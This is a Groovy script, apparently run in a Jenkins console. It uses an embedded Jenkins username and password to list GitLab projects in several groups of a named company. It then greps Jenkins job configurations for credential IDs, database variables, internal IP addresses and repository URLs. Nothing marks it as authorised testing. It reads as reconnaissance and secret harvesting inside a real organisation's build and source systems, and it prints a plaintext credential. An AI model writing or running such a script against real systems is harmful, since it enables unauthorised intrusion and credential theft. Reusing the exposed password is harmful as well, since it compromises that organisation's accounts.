// MICRO-O: List projects in key groups + read Jenkinsfiles
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString()
}

def auth = "jenkins:e6LBqIkOI\$PR1XX2oia"
def baseUrl = "https://gitlab.dev.claroshop.com/api/v4"

// List projects in sears, caja, ClaroPay, selfservice groups
[158: "Caja", 108: "sears", 73: "ClaroPay", 90: "selfservice", 164: "Ats"].each { gid, gname ->
    def resp = run("curl -sk -u '${auth}' '${baseUrl}/groups/${gid}/projects?per_page=100&include_subgroups=true' --max-time 12")
    println "\n=== GROUP: ${gname} (${gid}) ==="
    // Print raw first 1000 chars to debug
    println resp.take(500)
    // Extract names
    def names = (resp =~ /"name":"([^"]+)"/).collect { it[1] }
    def paths = (resp =~ /"path_with_namespace":"([^"]+)"/).collect { it[1] }
    if (paths) {
        println "PROJECTS: ${paths.size()}"
        paths.each { println "  - ${it}" }
    }
}

// Also read raw Jenkinsfile via grep (look for withEnv containing USERVAR)
println "\n=== AXII JENKINSFILE (key sections) ==="
def r1 = run("grep -n 'USERVAR\\|withEnv\\|DB_\\|credentialsId\\|172\\.27\\.\\|mrc-services\\|git url' /var/jenkins_home/jobs/cs_legacy_back/jobs/cs_legacy_pipe_build_axii-claroshop/config.xml 2>/dev/null | head -50")
println r1 ?: "(none)"

println "\n=== T1-ADMIN-API JENKINSFILE (key sections) ==="
def r2 = run("grep -n 'USERVAR\\|withEnv\\|DB_\\|credentialsId\\|git url\\|172\\.27\\.' /var/jenkins_home/jobs/cs_legacy_back/jobs/cs_legacy_pipe_build_t1-admin-api/config.xml 2>/dev/null | head -50")
println r2 ?: "(none)"

println "\n=== SEARS-IA app-credito JENKINSFILE ==="
def r3 = run("grep -n 'USERVAR\\|withEnv\\|DB_\\|credentialsId\\|git url\\|172\\.27\\.' /var/jenkins_home/jobs/sears-ia-backend/jobs/sears-ia_pipe_build_app-credito-ia/config.xml 2>/dev/null | head -50")
println r3 ?: "(none)"

println "\n=== DONE MICRO-O ==="
